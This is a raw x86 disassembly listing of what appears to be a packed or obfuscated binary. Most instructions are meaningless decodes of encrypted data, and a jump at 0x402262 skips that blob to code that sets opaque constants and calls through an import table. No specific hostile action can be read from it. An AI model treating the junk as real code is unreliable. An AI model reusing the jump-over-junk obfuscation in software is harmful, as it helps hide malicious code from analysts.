  402044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402045:	popf   
  402046:	dec    esi
  402047:	mov    DWORD PTR [esi-0x79],ebp
  40204a:	leave  
  40204b:	stc    
  40204c:	jns    0x401fea
  40204e:	arpl   WORD PTR [edi],di
  402050:	jg     0x402083
  402052:	and    al,bh
  402054:	ds dec edx
  402056:	sti    
  402057:	xchg   edi,eax
  402058:	add    al,0xf2
  40205a:	ret    
  40205b:	jae    0x402008
  40205d:	ds ret 0xe404
  402061:	in     eax,0x3e
  402063:	test   al,0x9c
  402065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402066:	lods   al,BYTE PTR ds:[esi]
  402067:	pop    esp
  402068:	fcom   DWORD PTR [edx]
  40206a:	mov    eax,edx
  40206c:	sbb    eax,0x4ecc403e
  402071:	push   ss
  402072:	call   0x6f59:0x2adb192b
  402079:	sub    dl,BYTE PTR ds:[edx*1+0x1f43ca3a]
  402081:	call   FWORD PTR [esi-0x517e0fb2]
  402087:	in     al,dx
  402088:	inc    ebx
  402089:	sbb    BYTE PTR [edi+0x3d2d58e5],dh
  40208f:	outs   dx,DWORD PTR ds:[esi]
  402090:	xchg   esp,eax
  402091:	push   eax
  402092:	push   ecx
  402093:	push   0x43e1bc24
  402098:	xor    al,0x7c
  40209a:	pop    edx
  40209b:	dec    edx
  40209c:	pop    ds
  40209d:	loopne 0x4020d6
  40209f:	test   eax,0x88240c94
  4020a4:	jmp    0xdca9:0xbf6ced50
  4020ab:	stc    
  4020ac:	push   0x4d
  4020ae:	nop
  4020af:	push   ds
  4020b0:	mov    es,WORD PTR [eax-0x56]
  4020b3:	jl     0x40211d
  4020b5:	fstp   DWORD PTR [ebx]
  4020b7:	sub    al,0x50
  4020b9:	add    ebx,DWORD PTR [ecx-0x19a4e3e6]
  4020bf:	inc    eax
  4020c0:	cmp    esi,eax
  4020c2:	push   edi
  4020c3:	jecxz  0x402107
  4020c5:	mov    esp,0x8298769a
  4020ca:	jnp    0x402114
  4020cc:	sbb    eax,0x2f0afc94
  4020d1:	fisubr DWORD PTR [ebx+0x4]
  4020d4:	adc    eax,0x857a55e1
  4020d9:	out    0x50,eax
  4020db:	mov    al,BYTE PTR [ecx+0x30ea18fb]
  4020e1:	inc    esp
  4020e2:	retf   
  4020e3:	add    bh,dl
  4020e5:	scas   al,BYTE PTR es:[edi]
  4020e6:	in     al,dx
  4020e7:	pop    ss
  4020e8:	ds mov bh,0x23
  4020eb:	push   es
  4020ec:	in     eax,0xd3
  4020ee:	lds    ebx,FWORD PTR [eax]
  4020f0:	sahf   
  4020f1:	shl    DWORD PTR [ebx],0x8e
  4020f4:	loopne 0x402158
  4020f6:	push   ebx
  4020f7:	je     0x402156
  4020f9:	out    dx,al
  4020fa:	cmc    
  4020fb:	pop    ebp
  4020fc:	and    BYTE PTR [eax-0x49],bl
  4020ff:	test   ch,bl
  402101:	or     ebp,DWORD PTR [edx-0x7e]
  402104:	les    eax,FWORD PTR [esi+0x4f]
  402107:	mov    WORD PTR [eax-0x18fb05eb],ss
  40210d:	test   BYTE PTR [ebx+0x25effbf],al
  402113:	call   0x1b66269e
  402118:	shl    ah,cl
  40211a:	push   esp
  40211b:	mov    bl,0xfb
  40211d:	mov    es,esi
  40211f:	jnp    0x402129
  402121:	xchg   ebp,eax
  402122:	int3   
  402123:	push   ebx
  402124:	out    0xc0,al
  402126:	sub    ecx,DWORD PTR [edx]
  402128:	jne    0x402138
  40212a:	into   
  40212b:	mov    ch,0xc5
  40212d:	shr    BYTE PTR [ebx+edx*8],1
  402130:	leave  
  402131:	or     BYTE PTR [ebx+0x7be62a36],ch
  402137:	mov    DWORD PTR [eax],ebp
  402139:	lods   eax,DWORD PTR ds:[esi]
  40213a:	mov    eax,0x9d13395d
  40213f:	in     eax,dx
  402140:	scas   eax,DWORD PTR es:[edi]
  402141:	add    ebx,DWORD PTR [edi]
  402143:	fisubr WORD PTR [eax]
  402145:	or     BYTE PTR [edx-0x58],0xd7
  402149:	imul   esi,DWORD PTR [esi+0x782de3b5],0x40
  402150:	jle    0x40212b
  402152:	in     al,dx
  402153:	jbe    0x4021c3
  402155:	adc    al,0x93
  402157:	out    dx,eax
  402158:	and    BYTE PTR [esi+ebp*4],ah
  40215b:	fwait
  40215c:	mov    cl,0xe6
  40215e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40215f:	push   edi
  402160:	jmp    0x45e6:0xd5ac4c51
  402167:	xchg   ecx,eax
  402168:	or     DWORD PTR [ebx],esp
  40216a:	lea    esi,[esi]
  40216c:	mov    dl,0x7
  40216e:	ss scas eax,DWORD PTR es:[edi]
  402170:	or     eax,0xb6d4a236
  402175:	sub    DWORD PTR [ebx+0xa],edi
  402178:	call   0xd862:0xa4ed6bb1
  40217f:	mov    bl,0xf6
  402181:	inc    edx
  402182:	xchg   ebp,eax
  402183:	push   ebp
  402184:	mov    ch,0x7f
  402186:	data16 movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  402189:	je     0x4021e3
  40218b:	(bad)  
  40218c:	int3   
  40218d:	cld    
  40218e:	mov    dh,0xe3
  402190:	mov    gs,WORD PTR gs:[ecx-0x79]
  402194:	push   0x9361b4b4
  402199:	rcr    bh,1
  40219b:	jne    0x402146
  40219d:	into   
  40219e:	sub    eax,0x3250e9ee
  4021a3:	int3   
  4021a4:	test   BYTE PTR [ebp+0x24],cl
  4021a7:	push   ss
  4021a8:	xchg   ebx,eax
  4021a9:	add    cl,BYTE PTR [esi]
  4021ab:	sub    al,0xe3
  4021ad:	add    dl,ch
  4021af:	pop    ss
  4021b0:	addr16 repz call 0xaa9e:0xa53f5461
  4021b9:	pop    edx
  4021ba:	int3   
  4021bb:	mov    eax,ds:0xe65528bd
  4021c0:	sub    BYTE PTR [esi+0x13],0x2c
  4021c4:	dec    eax
  4021c5:	in     al,dx
  4021c6:	test   esi,edx
  4021c8:	sti    
  4021c9:	adc    al,0xb7
  4021cb:	cmp    BYTE PTR [ebx+ebp*4],ch
  4021ce:	xor    bl,BYTE PTR [ecx-0x5d39155a]
  4021d4:	push   ebp
  4021d5:	xor    ebx,edi
  4021d7:	aaa    
  4021d8:	in     eax,0x4f
  4021da:	jnp    0x4021cf
  4021dc:	shl    DWORD PTR [eax+0x5085181f],0x46
  4021e3:	push   ss
  4021e4:	int3   
  4021e5:	repz das 
  4021e7:	mov    dl,al
  4021e9:	pop    esi
  4021ea:	(bad)  
  4021eb:	and    edi,DWORD PTR [esi-0x63]
  4021ee:	lahf   
  4021ef:	sbb    eax,esp
  4021f1:	sahf   
  4021f2:	dec    ebx
  4021f3:	mov    esp,0xaf782d1b
  4021f8:	pop    edx
  4021f9:	mov    dl,0xc5
  4021fb:	retf   
  4021fc:	ins    BYTE PTR es:[edi],dx
  4021fd:	sbb    ebx,0x2bc3804c
  402203:	les    ebx,FWORD PTR [esi+0x3d]
  402206:	or     al,BYTE PTR [ebx]
  402208:	rol    BYTE PTR [esi],cl
  40220a:	adc    BYTE PTR [ecx],bl
  40220c:	mov    esi,0x6824fcb0
  402211:	or     eax,0x7bd8852b
  402216:	or     BYTE PTR [edi],cl
  402218:	mov    dh,0x6
  40221a:	and    ebx,DWORD PTR [ebp-0x680bcc34]
  402220:	adc    edi,DWORD PTR [eax+0x4a44c898]
  402226:	fsub   QWORD PTR [edx]
  402228:	or     BYTE PTR [edi-0x3090252c],cl
  40222e:	aam    0xab
  402230:	dec    ebp
  402231:	mov    ds:0x68190739,eax
  402236:	push   edx
  402237:	sub    BYTE PTR [edi+0x11037819],0x13
  40223e:	out    0x74,eax
  402240:	mov    ds:0x3f51660,eax
  402245:	shl    BYTE PTR es:[esi-0x7a],1
  402249:	push   edi
  40224a:	push   ss
  40224b:	dec    eax
  40224c:	jle    0x4022a3
  40224e:	mov    DWORD PTR [ebp-0x6c],0x188
  402255:	mov    DWORD PTR [ebp-0x70],0x5b3f
  40225c:	and    DWORD PTR ds:0x4228be,ecx
  402262:	jmp    0x4027ec
  402267:	loope  0x402242
  402269:	mov    bh,0x25
  40226b:	scas   eax,DWORD PTR es:[edi]
  40226c:	sbb    DWORD PTR [ecx+0x19],ebx
  40226f:	dec    edx
  402270:	retf   0x7262
  402273:	loopne 0x4022c3
  402275:	loop   0x4022df
  402277:	mov    eax,ds:0x3d1616f6
  40227c:	add    al,0x16
  40227e:	push   ss
  40227f:	sub    bh,dh
  402281:	xchg   esp,eax
  402282:	adc    al,0xeb
  402284:	aaa    
  402285:	jno    0x402242
  402287:	adc    al,0xa4
  402289:	loop   0x4022e6
  40228b:	daa    
  40228c:	cmc    
  40228d:	std    
  40228e:	inc    esp
  40228f:	jae    0x402290
  402291:	or     esi,esp
  402293:	ret    0x3164
  402296:	lea    eax,[edi-0x64]
  402299:	out    0x15,eax
  40229b:	mov    eax,0x3dce40ae
  4022a0:	movnti DWORD PTR [esp+ebx*8],edx
  4022a4:	push   0xa193c515
  4022a9:	arpl   WORD PTR [edi+0x51],si
  4022ac:	lods   al,BYTE PTR ds:[esi]
  4022ad:	sub    dh,dl
  4022af:	popa   
  4022b0:	arpl   WORD PTR ds:0xc76942e0,dx
  4022b6:	or     bl,BYTE PTR [ebx]
  4022b8:	setge  dl
  4022bb:	stos   BYTE PTR es:[edi],al
  4022bc:	retf   0xdea2
  4022bf:	sar    DWORD PTR [ebx],0xd0
  4022c2:	ror    BYTE PTR [edx+0x28],1
  4022c5:	es mov ch,0x64
  4022c8:	inc    ebp
  4022c9:	xor    eax,0x3982235e
  4022ce:	dec    ecx
  4022cf:	test   eax,ebx
  4022d1:	(bad)  
  4022d2:	pop    esi
  4022d3:	pop    es
  4022d4:	sub    al,0xdf
  4022d6:	aad    0x15
  4022d8:	gs dec eax
  4022da:	xchg   ebx,eax
  4022db:	test   eax,0xa6282496
  4022e0:	mov    esi,0xf1d313c6
  4022e5:	mov    ecx,0x677c2985
  4022ea:	sub    ecx,ecx
  4022ec:	xor    eax,0x90fa98bb
  4022f1:	div    dh
  4022f3:	rcl    DWORD PTR [ecx-0x63fabf99],0xbe
  4022fa:	cdq    
  4022fb:	mov    dh,0xb1
  4022fd:	bound  esp,QWORD PTR [ecx]
  4022ff:	fsub   QWORD PTR [ecx]
  402301:	push   ebp
  402302:	mov    cl,BYTE PTR [esi-0x1]
  402305:	inc    esi
  402306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402307:	push   cs
  402308:	cmc    
  402309:	sbb    DWORD PTR [eax+ecx*8+0xf825aaa],esi
  402310:	xchg   esi,eax
  402311:	dec    edx
  402312:	push   edx
  402313:	mov    cl,0x9f
  402315:	(bad)  [ecx+esi*1-0x51]
  402319:	push   ebx
  40231a:	pop    ecx
  40231b:	xchg   edx,eax
  40231c:	fneni(8087 only) 
  40231e:	neg    eax
  402320:	lds    edx,FWORD PTR [eax+0x1]
  402323:	inc    esp
  402324:	inc    esi
  402325:	data16 stc 
  402327:	fcom   QWORD PTR [ebx+0x486aec76]
  40232d:	jge    0x40236c
  40232f:	cmp    ebp,ecx
  402331:	mov    ds:0x7949e2a4,al
  402336:	sub    DWORD PTR [edx-0x34ca2c54],edi
  40233c:	rcl    DWORD PTR [edx+0x5],1
  40233f:	(bad)  
  402340:	adc    esi,DWORD PTR [esi+0x76]
  402343:	pushf  
  402344:	cmp    eax,0x4387bf70
  402349:	or     ah,BYTE PTR [edi*1+0x29792d9a]
  402350:	jecxz  0x402368
  402352:	cwde   
  402353:	mul    ecx
  402355:	ds js  0x402370
  402358:	nop
  402359:	fwait
  40235a:	jl     0x4023b0
  40235c:	push   ebx
  40235d:	adc    eax,0xab2c95c0
  402362:	cs icebp 
  402364:	out    0x92,eax
  402366:	popf   
  402367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402368:	mov    bl,BYTE PTR [ebp-0x68]
  40236b:	jl     0x4022f1
  40236d:	jecxz  0x402352
  40236f:	outs   dx,BYTE PTR ds:[esi]
  402370:	dec    ecx
  402371:	sbb    al,cl
  402373:	xchg   ebp,eax
  402374:	pop    ss
  402375:	es popf 
  402377:	dec    edx
  402378:	sti    
  402379:	test   eax,0x66e046ad
  40237e:	inc    ebx
  40237f:	dec    ecx
  402380:	sbb    al,0xa
  402382:	push   esp
  402383:	call   DWORD PTR [edi]
  402385:	sub    al,0x1
  402387:	mov    ah,0x34
  402389:	dec    esp
  40238a:	mov    ecx,0xa6a38487
  40238f:	in     al,0x76
  402391:	div    DWORD PTR [esi-0xee49d85]
  402397:	fs pop edx
  402399:	aam    0x90
  40239b:	mov    edx,0x2afa6a7a
  4023a0:	repz mov ebx,0xb2a48d8a
  4023a6:	add    esi,DWORD PTR [ebx+0x426f92af]
  4023ac:	cmp    ch,BYTE PTR [ebx]
  4023ae:	xor    esi,DWORD PTR [ecx-0x5aa8fda5]
  4023b4:	mov    eax,0x9989edc6
  4023b9:	cdq    
  4023ba:	ret    0x53ba
  4023bd:	test   al,0x58
  4023bf:	cs or  al,0xce
  4023c2:	jne    0x402383
  4023c4:	pop    ebx
  4023c5:	push   ecx
  4023c6:	ins    BYTE PTR es:[edi],dx
  4023c7:	retf   
  4023c8:	into   
  4023c9:	call   0x95c8:0xb2ddc3
  4023d0:	dec    esi
  4023d1:	jecxz  0x4023da
  4023d3:	xchg   ebx,eax
  4023d4:	into   
  4023d5:	gs loopne 0x402360
  4023d8:	push   ss
  4023d9:	shl    ebp,0x4
  4023dc:	clc    
  4023dd:	xchg   edi,eax
  4023de:	and    ebx,DWORD PTR [edx+eax*4-0x28edba1f]
  4023e5:	into   
  4023e6:	mov    eax,ds:0xf49b530a
  4023eb:	fiadd  WORD PTR [ebx-0x12]
  4023ee:	je     0x402401
  4023f0:	imul   ebx,DWORD PTR [ebx-0x6],0xffffff84
  4023f4:	pop    ss
  4023f5:	or     eax,0xefff8528
  4023fa:	rdpmc  
  4023fc:	imul   eax,ebx,0x37
  4023ff:	mov    ds:0x140e3ba9,eax
  402404:	cld    
  402405:	push   es
  402406:	jge    0x4023cd
  402408:	xlat   BYTE PTR ds:[ebx]
  402409:	sub    BYTE PTR [eax+0x119e00f8],bh
  40240f:	and    BYTE PTR [ecx],bh
  402411:	shr    dh,0x30
  402414:	push   esp
  402415:	mov    DWORD PTR [edi+0x76],ecx
  402418:	(bad)  
  402419:	mov    eax,ds:0x53d917d2
  40241e:	in     eax,0x4c
  402420:	and    BYTE PTR [edx+eiz*1-0x4db4a486],bl
  402427:	fucomp st(7)
  402429:	inc    edi
  40242a:	add    al,0x23
  40242c:	call   FWORD PTR [esi]
  40242e:	add    al,0xee
  402430:	xor    BYTE PTR [eax+0x175b1628],0x1c
  402437:	jbe    0x4024a1
  402439:	xor    ah,BYTE PTR [edx-0x31]
  40243c:	rcl    edi,1
  40243e:	dec    eax
  40243f:	not    DWORD PTR [ecx-0x1b0b8689]
  402445:	mov    ebp,0x6fe03d8a
  40244a:	add    edx,DWORD PTR [edx+0x26670068]
  402450:	std    
  402451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402452:	mov    bl,BYTE PTR [edi+eiz*8]
  402455:	mov    ds:0xfe44e34f,al
  40245a:	shl    edx,1
  40245c:	(bad)  
  40245e:	aad    0xdd
  402460:	inc    edi
  402461:	push   edi
  402462:	or     BYTE PTR [edx+0x44206e75],ah
  402468:	ficom  WORD PTR [eax-0x71]
  40246b:	mov    ah,0x6e
  40246d:	outs   dx,DWORD PTR ds:[esi]
  40246e:	push   0xffffffc0
  402470:	or     al,0xee
  402472:	das    
  402473:	(bad)  
  402474:	xor    eax,0x71cfb1a0
  402479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40247a:	mov    ebp,0xfb1b232c
  40247f:	bound  edx,QWORD PTR [ebx+eiz*1-0x7b]
  402483:	lods   al,BYTE PTR ds:[esi]
  402484:	dec    esp
  402485:	dec    esp
  402486:	pop    ss
  402487:	(bad)  
  402488:	adc    al,0xf1
  40248a:	add    bl,BYTE PTR [ebx+0x36]
  40248d:	stc    
  40248e:	jle    0x4024bd
  402490:	push   esi
  402491:	fidivr DWORD PTR [eax+edx*1]
  402494:	jnp    0x40245e
  402496:	jge    0x4024c5
  402498:	pop    edi
  402499:	add    ch,BYTE PTR [ebp+eiz*8-0x46]
  40249d:	pop    ss
  40249e:	inc    edi
  40249f:	or     ebx,edx
  4024a1:	sbb    eax,0x9f877885
  4024a6:	mul    DWORD PTR [esp+esi*1-0x5176b51b]
  4024ad:	pop    ecx
  4024ae:	xor    al,0x25
  4024b0:	loope  0x402501
  4024b2:	mov    al,0xdf
  4024b4:	add    eax,0x73c55ed2
  4024b9:	sti    
  4024ba:	mov    esi,ebx
  4024bc:	mov    al,ds:0xe9b692ba
  4024c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024c2:	(bad)  
  4024c3:	jmp    0x1e4c773b
  4024c8:	pop    edi
  4024c9:	push   esi
  4024ca:	sub    DWORD PTR [esi+esi*4+0x3e6111bb],eax
  4024d1:	cmc    
  4024d2:	mov    dh,0xd5
  4024d4:	lahf   
  4024d5:	test   DWORD PTR [ebx-0x34],esi
  4024d8:	jle    0x4024f2
  4024da:	ins    DWORD PTR es:[edi],dx
  4024db:	out    0x77,eax
  4024dd:	dec    ecx
  4024de:	inc    ebp
  4024df:	jmp    0x4024aa
  4024e1:	aam    0xa9
  4024e3:	add    esi,ebx
  4024e5:	or     al,0x3c
  4024e7:	dec    edx
  4024e8:	inc    esi
  4024e9:	mov    es,WORD PTR [ebx]
  4024eb:	mov    WORD PTR [edx],gs
  4024ed:	repz sub DWORD PTR [eax],edx
  4024f0:	add    eax,0x5bb094f2
  4024f5:	push   edx
  4024f6:	cs icebp 
  4024f8:	in     eax,dx
  4024f9:	cmp    ch,BYTE PTR [ebx]
  4024fb:	rol    dl,1
  4024fd:	jae    0x4024ae
  4024ff:	fst    QWORD PTR [ecx]
  402501:	int3   
  402502:	arpl   bx,dx
  402504:	jp     0x402562
  402506:	xchg   ecx,eax
  402507:	aaa    
  402508:	lahf   
  402509:	mov    al,ds:0xc3f65ee8
  40250e:	int3   
  40250f:	jnp    0x402532
  402511:	or     al,BYTE PTR [esi-0x2088838f]
  402517:	sti    
  402518:	div    eax
  40251a:	imul   ebx,DWORD PTR [eax],0xcd83f0a
  402520:	loope  0x402585
  402522:	lea    ebp,[esi+0x66]
  402525:	cwde   
  402526:	cli    
  402527:	mov    edi,0xbfa9a4d1
  40252c:	jmp    0x402505
  40252e:	mov    ebx,0x2a9c1913
  402533:	mov    ds:0x8bb988b2,al
  402538:	cmp    ch,BYTE PTR [edx]
  40253a:	fiadd  DWORD PTR [ecx]
  40253c:	pop    ds
  40253d:	fidiv  WORD PTR [esi+ebx*8-0x4db99efe]
  402544:	repz es int 0xca
  402548:	jne    0x402543
  40254a:	inc    edi
  40254b:	into   
  40254c:	or     al,0x52
  40254e:	push   eax
  40254f:	retf   
  402550:	sti    
  402551:	sbb    esp,DWORD PTR [ecx]
  402553:	push   esp
  402554:	fnstenv [ecx+0xb]
  402557:	loopne 0x402543
  402559:	and    BYTE PTR es:[ebx+0x48],dl
  40255d:	jns    0x4025d4
  40255f:	mov    ch,0x35
  402561:	or     ch,BYTE PTR [ecx+0x34f50292]
  402567:	dec    eax
  402568:	mov    WORD PTR [eax],gs
  40256a:	and    ebp,DWORD PTR [ebp+0xf]
  40256d:	mov    BYTE PTR [esi+0x3eac9f3],ah
  402573:	fxtract 
  402575:	popa   
  402576:	mov    ?,bp
  402579:	mov    ecx,0x57444218
  40257e:	jmp    0x8aa7c76
  402583:	and    eax,0xc319df59
  402588:	xchg   edi,eax
  402589:	sar    edi,cl
  40258b:	aad    0xc4
  40258d:	sar    DWORD PTR [esp+eiz*8+0x46],0x18
  402592:	add    al,0xc3
  402594:	or     al,0xa9
  402596:	ja     0x4025e8
  402598:	retf   
  402599:	sbb    DWORD PTR [ecx-0x1af4e9a4],esi
  40259f:	mov    bh,0x9f
  4025a1:	(bad)
  4025a5:	push   es
  4025a6:	ins    BYTE PTR es:[edi],dx
  4025a7:	mov    ah,0xb6
  4025a9:	xchg   esi,eax
  4025aa:	sub    BYTE PTR [ebx+0xe41963d],bl
  4025b0:	add    eax,0x2f2a1fca
  4025b5:	into   
  4025b6:	retf   0xc0e8
  4025b9:	xlat   BYTE PTR ds:[ebx]
  4025ba:	stc    
  4025bb:	test   ecx,ecx
  4025bd:	and    bh,dl
  4025bf:	dec    esi
  4025c0:	(bad)  [edi+0x42f31d32]
  4025c6:	js     0x4025d9
  4025c8:	rcl    DWORD PTR [edi+0x21de6e0e],1
  4025ce:	out    dx,eax
  4025cf:	jbe    0x4025a6
  4025d1:	(bad)  
  4025d2:	fistp  QWORD PTR [esi-0x55]
  4025d5:	push   es
  4025d6:	cmp    al,BYTE PTR ds:0xe38a9af4
  4025dc:	fimul  WORD PTR [edi]
  4025de:	nop
  4025df:	(bad)  
  4025e0:	add    al,ch
  4025e2:	adc    ch,BYTE PTR ds:[ebp-0x33]
  4025e6:	push   edx
  4025e7:	pop    ebp
  4025e8:	xor    al,BYTE PTR [edx-0x30]
  4025eb:	sbb    ebp,DWORD PTR [esi]
  4025ed:	lock lahf 
  4025ef:	mov    ds:0x20be2981,eax
  4025f4:	xor    eax,0x7bc17fbf
  4025f9:	rcl    BYTE PTR [edx-0x317cd3a9],cl
  4025ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402600:	sub    al,0x46
  402602:	xor    esp,edx
  402604:	jnp    0x402648
  402606:	pop    ss
  402607:	lea    ecx,[edi]
  402609:	addr16 push 0x48
  40260c:	inc    esi
  40260d:	inc    eax
  40260e:	and    BYTE PTR [ebp+0x49676a9],bh
  402614:	sbb    BYTE PTR [ecx+0x33b44b76],bh
  40261a:	jmp    0xcce0e0b
  40261f:	xlat   BYTE PTR ds:[ebx]
  402620:	dec    esp
  402621:	or     DWORD PTR [eax],eax
  402623:	cmp    BYTE PTR [ecx-0x2e],bl
  402626:	cdq    
  402627:	cs aaa 
  402629:	adc    dl,BYTE PTR [ebx+0x25]
  40262c:	in     eax,dx
  40262d:	in     al,dx
  40262e:	ror    BYTE PTR [esi],cl
  402630:	aas    
  402631:	xor    dl,BYTE PTR [edi+0x2a]
  402634:	jg     0x4025d2
  402636:	aaa    
  402637:	out    dx,al
  402638:	(bad)  
  402639:	(bad)  
  40263a:	into   
  40263b:	icebp  
  40263c:	fs jns 0x402608
  40263f:	adc    eax,0xa35321b3
  402644:	xor    DWORD PTR [eax+0x7f],edx
  402647:	mov    dh,0x1f
  402649:	jl     0x4025ea
  40264b:	inc    DWORD PTR [edx-0x5c]
  40264e:	sti    
  40264f:	sub    eax,0x476feac
  402654:	adc    al,0x54
  402656:	push   es
  402657:	push   edi
  402658:	jmp    0x4026cb
  40265a:	sbb    edi,ebp
  40265c:	ror    DWORD PTR [eax],cl
  40265e:	or     BYTE PTR [eax+ebx*8-0x49d13226],dh
  402665:	push   ebx
  402666:	ret    
  402667:	inc    esp
  402668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402669:	push   edx
  40266a:	mov    ds:0xb939bd9f,eax
  40266f:	xchg   edx,eax
  402670:	add    bl,BYTE PTR [ebx+0x61]
  402673:	cmp    edi,0x329eadeb
  402679:	mov    ebp,0x78e3a212
  40267e:	lea    esi,[eax-0x2cb2d5dd]
  402684:	mov    dl,0x8
  402686:	mov    DWORD PTR [edx-0x4f],edi
  402689:	(bad)  
  40268a:	test   al,0x3a
  40268c:	enter  0x26d1,0xd8
  402690:	test   al,0x49
  402692:	scas   eax,DWORD PTR es:[edi]
  402693:	mov    dh,BYTE PTR [edi+0x40]
  402696:	mov    ecx,0x1a192cf5
  40269b:	repz and BYTE PTR [edx-0x6b],dl
  40269f:	(bad)  
  4026a0:	cmp    al,BYTE PTR [edx]
  4026a2:	and    edi,DWORD PTR [ecx-0x55]
  4026a5:	mov    ebp,0x4ceff93
  4026aa:	jp     0x402652
  4026ac:	sub    eax,0xebe35429
  4026b1:	mul    cl
  4026b3:	push   ebp
  4026b4:	add    ecx,DWORD PTR ds:0xfe888015
  4026ba:	(bad)  
  4026bb:	cs in  eax,0x18
  4026be:	ds out dx,eax
  4026c0:	outs   dx,BYTE PTR ds:[esi]
  4026c1:	idiv   DWORD PTR ds:0xd79a10cc
  4026c7:	pop    edx
  4026c8:	xchg   ebp,eax
  4026c9:	mov    WORD PTR [eax],ss
  4026cb:	pop    es
  4026cc:	mov    esi,cs
  4026ce:	push   0xa
  4026d0:	ds mov ah,0xf9
  4026d3:	in     eax,dx
  4026d4:	xchg   ecx,eax
  4026d5:	cmp    ch,ah
  4026d7:	popf   
  4026d8:	jnp    0x4026b9
  4026da:	aam    0xac
  4026dc:	push   eax
  4026dd:	jmp    0x402715
  4026df:	add    eax,0x9ce2688d
  4026e4:	aam    0x6a
  4026e6:	test   al,0x86
  4026e8:	jb     0x40273b
  4026ea:	mov    al,ds:0x99addc1e
  4026ef:	mov    ds:0xef36684f,eax
  4026f4:	arpl   bx,bp
  4026f6:	mov    dl,0xff
  4026f8:	mov    ch,0xed
  4026fa:	adc    DWORD PTR [esi+ebp*8-0x658d647b],0xf4da5120
  402705:	adc    al,0x1
  402707:	mov    ecx,0x2dc40263
  40270c:	inc    ebx
  40270d:	cmc    
  40270e:	jl     0x4026bc
  402710:	and    al,0xfd
  402712:	push   edi
  402713:	xor    dh,BYTE PTR [ecx+edx*2+0x32]
  402717:	std    
  402718:	sub    al,0xb3
  40271a:	mov    ss,WORD PTR ds:[ebx+0x7a49215c]
  402721:	outs   dx,DWORD PTR ds:[esi]
  402722:	pusha  
  402723:	idiv   DWORD PTR [esi+0x3d096a1b]
  402729:	sbb    al,0x2a
  40272b:	jo     0x402749
  40272d:	push   edi
  40272e:	jg     0x402767
  402730:	cli    
  402731:	shr    DWORD PTR [esi],0xbb
  402734:	sbb    DWORD PTR [eax+0x13cfaafe],esi
  40273a:	mov    cl,0x8a
  40273c:	not    DWORD PTR [eax]
  40273e:	push   ecx
  40273f:	mov    ebp,0xa894e792
  402744:	add    bh,BYTE PTR [ecx]
  402746:	sub    al,0x74
  402748:	jns    0x402772
  40274a:	stos   BYTE PTR es:[edi],al
  40274b:	jmp    0x3c11:0x8312e3d6
  402752:	call   ecx
  402754:	jg     0x40271e
  402756:	sub    bh,bl
  402758:	(bad)  
  402759:	pusha  
  40275a:	or     bl,dh
  40275c:	mov    bh,0x8a
  40275e:	ret    
  40275f:	push   0x99ee1da5
  402764:	xchg   ebp,eax
  402765:	xchg   edx,eax
  402766:	cli    
  402767:	loop   0x4027bb
  402769:	cmp    eax,0x5e862d4
  40276e:	and    ah,cl
  402770:	push   ss
  402771:	pop    ecx
  402772:	inc    edi
  402773:	inc    edx
  402774:	ja     0x4027d8
  402776:	(bad)  
  402777:	push   ebx
  402778:	sub    ch,BYTE PTR [edi]
  40277a:	jg     0x402759
  40277c:	arpl   WORD PTR [ebx-0x72],ax
  40277f:	std    
  402780:	inc    ebp
  402781:	mov    al,BYTE PTR [ecx+0x3e90ed5c]
  402787:	push   ss
  402788:	stos   BYTE PTR es:[edi],al
  402789:	sbb    BYTE PTR [ecx-0x314b035d],ch
  40278f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402790:	aam    0x47
  402792:	in     al,0x54
  402794:	push   ds
  402795:	sub    ch,bh
  402797:	cmp    BYTE PTR [esi-0x67794d3e],bl
  40279d:	ja     0x40276a
  40279f:	dec    ebx
  4027a0:	popf   
  4027a1:	xchg   ebp,eax
  4027a2:	xlat   BYTE PTR ds:[ebx]
  4027a3:	add    BYTE PTR [eax],bl
  4027a5:	daa    
  4027a6:	jmp    0x402825
  4027a8:	(bad)  
  4027aa:	adc    DWORD PTR [edi-0x3ba740e5],edi
  4027b0:	and    eax,0x5b2e4564
  4027b5:	mov    ds:0x6335a96c,al
  4027ba:	out    0xc5,eax
  4027bc:	inc    esi
  4027bd:	mov    edx,0x34814f10
  4027c2:	out    0xcb,eax
  4027c4:	fcmovb st,st(3)
  4027c6:	push   ds
  4027c7:	adc    BYTE PTR ds:[ebx+0x41],bl
  4027cb:	push   edx
  4027cc:	and    BYTE PTR [eax],bl
  4027ce:	fwait
  4027cf:	(bad)  
  4027d0:	gs in  eax,dx
  4027d2:	shl    BYTE PTR [esi],0x1f
  4027d5:	stos   DWORD PTR es:[edi],eax
  4027d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027d7:	or     DWORD PTR [edi],edi
  4027d9:	push   ebx
  4027da:	aad    0xf1
  4027dc:	out    dx,eax
  4027dd:	cmp    ecx,DWORD PTR [ebp-0x52]
  4027e0:	ficom  WORD PTR [edi-0x2c]
  4027e3:	jp     0x402780
  4027e5:	fs cs add eax,0x88bc6fd1
  4027ec:	mov    DWORD PTR [ebp-0x6c],0x3219
  4027f3:	mov    DWORD PTR [ebp-0x70],0x231c
  4027fa:	cmp    DWORD PTR ds:0x4229aa,0x0
  402801:	mov    DWORD PTR ds:0x422962,0x2a7e
  40280b:	mov    DWORD PTR ds:0x42293e,0x75fd
  402815:	jmp    0x40286f
  40281a:	not    DWORD PTR ds:0x4228a2
  402820:	jg     0x40285d
  402826:	push   0x445a
  40282b:	push   DWORD PTR [ebp-0x24]
  40282e:	push   0x4228fe
  402833:	push   0x30cc
  402838:	push   0x5f1f
  40283d:	call   DWORD PTR ds:0x42a288
  402843:	xor    DWORD PTR ds:0x4228da,0x678e
  40284d:	adc    DWORD PTR ds:0x4228a2,0x5868
  402857:	xor    DWORD PTR ds:0x42296e,ecx
  40285d:	or     DWORD PTR ds:0x4228ba,edi
  402863:	or     DWORD PTR ds:0x42299e,ecx
